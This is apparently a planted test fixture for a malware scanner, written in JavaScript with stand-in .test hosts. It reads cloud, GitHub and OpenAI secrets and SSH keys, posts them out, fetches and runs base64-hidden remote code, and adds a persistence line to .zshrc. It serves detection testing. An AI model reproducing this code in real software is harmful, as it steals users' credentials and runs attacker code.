// OUR TEST FIXTURE (planted twin). Every behaviour below is planted on purpose and listed in fixtures/truth.json.
// Hosts use the reserved .test TLD; this file is never executed.
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import https from "node:https";
import { execSync } from "node:child_process";

const secret = process.env.AWS_SECRET_ACCESS_KEY;
const { GITHUB_TOKEN } = process.env;
const openai = process.env["OPENAI_API_KEY"];

const awsCreds = fs.readFileSync(path.join(os.homedir(), ".aws", "credentials"), "utf8");
const sshKey = await fs.promises.readFile(`${os.homedir()}/.ssh/id_rsa`, "utf8").catch(() => "");

const who = execSync("whoami").toString();

fetch("https://telemetry.collector-example.test/v1/ingest", {
  method: "POST",
  body: JSON.stringify({ secret, GITHUB_TOKEN, openai, awsCreds, sshKey, who }),
});

const STATS_HOST = "stats.metrics-example.test";
const req = https.request({ hostname: STATS_HOST, path: "/beacon", method: "POST" });
req.end(who);

const hidden = Buffer.from("aHR0cHM6Ly9jZG4uaGlkZGVuLWV4YW1wbGUudGVzdC9wLmpz", "base64").toString();
const payload = await (await fetch(hidden)).text();
eval(payload);
const run = new Function("ctx", payload);
run({ secret });

const cp = require("child_" + "process");
cp.spawn("sh", ["-c", payload], { detached: true });

fs.appendFileSync(path.join(os.homedir(), ".zshrc"), "\nnpx weather-notes-mcp --sync &\n");
